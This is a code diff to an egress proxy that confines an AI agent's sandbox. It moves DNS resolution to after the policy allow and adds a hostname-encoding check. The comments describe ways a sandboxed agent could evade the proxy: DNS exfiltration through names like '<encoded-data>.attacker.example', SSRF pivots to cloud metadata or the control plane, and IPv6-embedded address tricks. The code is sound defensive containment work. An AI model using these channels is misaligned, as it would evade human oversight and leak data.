@@ -51,9 +51,11 @@ Fail-closed, with one deliberate exception:
 
 Control-plane isolation: this proxy is the only component on BOTH sandbox-net and
 a control network, so it — not network segmentation — is what keeps the agent off
-the control plane. Before any policy/permanent/port check it hard-refuses any
-destination that names a control-plane host or resolves into either control subnet
-(``_forbidden``), a guard that no rule, approval, or port change can widen.
+the control plane. It hard-refuses any destination that names a control-plane host
+or resolves into either control subnet (``_forbidden_reason``), a guard that no rule,
+approval, or port change can widen. The name check runs before anything else; the
+resolve runs only once policy has allowed the name, so the agent cannot use a held or
+refused name to send queries to a name server it controls.
 
 The control network this proxy joins is authorize-net, which carries ONLY
 ``/authorize``. That is deliberate and it is what bounds the damage here: this
@@ -162,14 +164,14 @@ logger = logging.getLogger("egress")
 # This proxy is the ONE component attached to BOTH sandbox-net and a control
 # network, so it — not network segmentation — is what actually keeps the agent off
 # the control plane: were the proxy to relay a connection onto authorize-net, the
-# agent would be talking to the control plane directly. We therefore refuse,
-# BEFORE any policy / permanent-lifeline check, any destination that names a
-# control-plane host or resolves into either control subnet. The two checks that
-# need no DNS run before even the port gate; the one that resolves runs after it,
-# so a request the port gate will refuse anyway never sends a DNS query on the
-# sandbox's behalf (see ``_forbidden_resolved``). Neither is ever consulted against
-# policy, so the guard cannot be widened by a rule, a human approval, a change to
-# the port allowlist, or a public name whose DNS is pointed at a control subnet.
+# agent would be talking to the control plane directly. We therefore refuse any
+# destination that names a control-plane host or resolves into either control
+# subnet. The checks that need no DNS run before even the port gate; the one that
+# resolves runs only after policy allowed the name, so a held or refused name never
+# sends a DNS query on the sandbox's behalf (see ``_forbidden_resolved``). No
+# outcome of policy overrides either, so the guard cannot be widened by a rule, a
+# human approval, a change to the port allowlist, or a public name whose DNS is
+# pointed at a control subnet.
 #
 # What a bypass here now costs is bounded by the API-surface split (see the module
 # docstring): the reachable listener serves /authorize alone, so the worst outcome
@@ -422,23 +424,23 @@ def _cidr_label(net) -> str:
 def _forbidden_reason(host: str) -> str | None:
     """Return a deny reason if this destination must never be dialed, else None.
     Covers the control plane's networks AND the private/special-use ranges
-    (cloud metadata / link-local, loopback, RFC1918 — see ``PRIVATE_CIDRS``): a
-    forbidden target is never weighed against policy, so no rule or human approval
-    can turn the proxy into an SSRF pivot to the instance-metadata service, the
-    Docker host, or the internal network. Three checks, cheapest first: a forbidden
-    hostname, a literal forbidden IP, then a name that RESOLVES into a forbidden
-    range. The hooks run the two halves separately — ``_forbidden_static`` before
-    the port gate, ``_forbidden_resolved`` after it — and this is the two joined,
-    for callers that want the whole verdict in one place.
+    (cloud metadata / link-local, loopback, RFC1918 — see ``PRIVATE_CIDRS``): no
+    rule or human approval overrides it, so neither can turn the proxy into an SSRF
+    pivot to the instance-metadata service, the Docker host, or the internal network.
+    Cheapest first: a forbidden hostname, a literal forbidden IP, a name DNS cannot
+    encode, then a name that RESOLVES into a forbidden range. The hooks run the two
+    halves separately — ``_forbidden_static`` before the port gate,
+    ``_forbidden_resolved`` only after policy allowed the name — and this is the two
+    joined, for callers that want the whole verdict in one place.
 
     Every check runs against the NORMALIZED destination (lowercased, trailing FQDN
     dot and IPv6 brackets stripped) and, in ``_blocked_cidr``, against the v4
     address that an IPv4-embedding IPv6 literal actually dials — so the guard is
     not spellable-around with ``[::ffff:172.31.0.2]``.
 
-    Two of these are DETERMINISTIC guarantees — the exact-hostname match and the
-    literal-IP-in-CIDR match decide from the request alone. The third (resolve
-    step) is BEST-EFFORT defense-in-depth: it depends on a DNS lookup, so it is
+    Three of these are DETERMINISTIC guarantees — the exact-hostname match, the
+    literal-IP-in-CIDR match and the encoding check decide from the request alone.
+    The fourth (resolve step) is BEST-EFFORT defense-in-depth: it depends on a DNS lookup, so it is
     subject to a TOCTOU/rebind gap (mitmproxy re-resolves when it dials) and to
     resolution failure. That is acceptable here ONLY because it is not the
     load-bearing control. Reaching the control plane is prevented first by network
@@ -453,29 +455,38 @@ def _forbidden_reason(host: str) -> str | None:
 
 
 def _forbidden_static(host: str) -> str | None:
-    """The deterministic half of ``_forbidden_reason``: a forbidden hostname or a
-    literal forbidden IP, decided from the request alone. No DNS, so it is cheap
-    enough to run first — before the port gate, so a probe at the control plane is
-    refused for what it is and not for the port it picked."""
+    """The deterministic half of ``_forbidden_reason``: a forbidden hostname, a
+    literal forbidden IP, or a name DNS cannot encode, decided from the request
+    alone. No DNS, so it is cheap enough to run first — before the port gate, so a
+    probe at the control plane is refused for what it is and not for the port it
+    picked.
+
+    The encoding check is the one Python makes before handing the name to the
+    resolver: ``getaddrinfo`` encodes a ``str`` host with the ``idna`` codec and
+    raises ``UnicodeError`` for an empty or over-long label or a character IDNA
+    refuses. Checked here so such a name is refused without being put to policy,
+    where it could raise a card."""
     h = _unbracket((host or "").lower()).rstrip(".")
     if h in FORBIDDEN_HOSTS:
         return f"forbidden destination host {host} (control plane)"
     net = _blocked_cidr(h)
     if net is not None:
         return f"forbidden destination IP {host} ({_cidr_label(net)})"
+    try:
+        h.encode("idna")
+    except UnicodeError:
+        return f"destination {host} is not a resolvable hostname"
     return None
 
 
 def _forbidden_resolved(host: str) -> str | None:
     """The resolving half of ``_forbidden_reason``: a name that resolves into a
-    forbidden range. Does DNS, so it runs in a worker thread (``_forbidden``) and
-    AFTER the local port gate. The order is the point: this lookup goes to the
-    proxy's upstream resolver on the sandbox's behalf, and a name is a channel —
-    ``CONNECT <encoded-data>.attacker.example:22`` used to resolve here before the
-    port gate refused it, which was a query per request at line rate, with no
-    control-plane round trip and no hold cap to slow it. Behind the port gate, only
-    a request that could actually proceed gets to resolve, and that one goes on to
-    a policy decision that bounds it."""
+    forbidden range. Does DNS, so it runs in a worker thread (``_forbidden``), and
+    only for a name policy has ALLOWED: the lookup reaches the authoritative server
+    of whoever owns the domain, so a held or refused name must never get here (see
+    proxies/egress/DESIGN.md, "Why the resolve waits for an allow"). The allow does
+    not override the verdict: a name that resolves into a forbidden range is still
+    refused."""
     if not _BLOCKED_CIDRS:
         return None
     h = _unbracket((host or "").lower()).rstrip(".")
@@ -832,7 +843,7 @@ async def http_connect(flow: http.HTTPFlow) -> None:
     # Refuse to relay onto the control plane / control-net BEFORE anything else
     # — this proxy is the only bridge between the two, so this guard is what keeps
     # the agent off the control plane, not (only) network segmentation. The half
-    # that needs DNS waits until the port gate has had its say (``_forbidden``).
+    # that needs DNS waits until policy has allowed the name (``_forbidden_resolved``).
     forbidden = _forbidden_static(host)
     if forbidden:
         _audit("deny", stage="connect", proto="connect", host=host, port=port,
@@ -846,15 +857,15 @@ async def http_connect(flow: http.HTTPFlow) -> None:
                       f"({sorted(ALLOWED_CONNECT_PORTS)})")
         _deny(flow)
         return
-    forbidden = await _forbidden(host)
-    if forbidden:
-        _audit("deny", stage="connect", proto="connect", host=host, port=port,
-               client=client, reason=forbidden, central=False)
-        _deny(flow)
-        return
     v = await _authorize(
         host, stage="connect", proto="connect", port=port, client=client)
     if v.allowed:
+        forbidden = await _forbidden(host)
+        if forbidden:
+            _audit("deny", stage="connect", proto="connect", host=host, port=port,
+                   client=client, reason=forbidden, central=False)
+            _deny(flow)
+            return
         # Remember the authorized authority for this connection so the SNI stage
         # can verify against it without a second (possibly re-holding) decision.
         _conn_authority[flow.client_conn.id] = host.lower()
@@ -955,8 +966,9 @@ async def request(flow: http.HTTPFlow) -> None:
     # sorted() only to make the "which name failed" report deterministic.
     names = sorted({transport_host, asserted_host})
     # Forbid control-plane / control-net for EVERY name the client asserts
-    # (transport host and Host/:authority), before policy. The static half runs
-    # before the port gate, the resolving half after it — see ``_forbidden``.
+    # (transport host and Host/:authority). The static half runs before the port
+    # gate, the resolving half only once policy allowed every name — see
+    # ``_forbidden_resolved``.
     for name in names:
         forbidden = _forbidden_static(name)
         if forbidden:
@@ -973,14 +985,6 @@ async def request(flow: http.HTTPFlow) -> None:
                       f"({sorted(allowed_ports)})")
         _deny(flow)
         return
-    for name in names:
-        forbidden = await _forbidden(name)
-        if forbidden:
-            _audit("deny", stage="http", proto=proto, host=name, port=port,
-                   client=client, method=flow.request.method,
-                   url=flow.request.pretty_url, reason=forbidden, central=False)
-            _deny(flow)
-            return
     bad_name, bad_reason, central = None, "", True
     for name in names:
         v = await _authorize(
@@ -995,6 +999,14 @@ async def request(flow: http.HTTPFlow) -> None:
             bad_name, bad_reason = name, v.reason
             break
     if bad_name is None:
+        for name in names:
+            forbidden = await _forbidden(name)
+            if forbidden:
+                _audit("deny", stage="http", proto=proto, host=name, port=port,
+                       client=client, method=flow.request.method,
+                       url=flow.request.pretty_url, reason=forbidden, central=False)
+                _deny(flow)
+                return
         _audit("allow", stage="http", proto=proto, host=asserted_host,
                port=port, method=flow.request.method, client=client,
                url=flow.request.pretty_url, central=central)
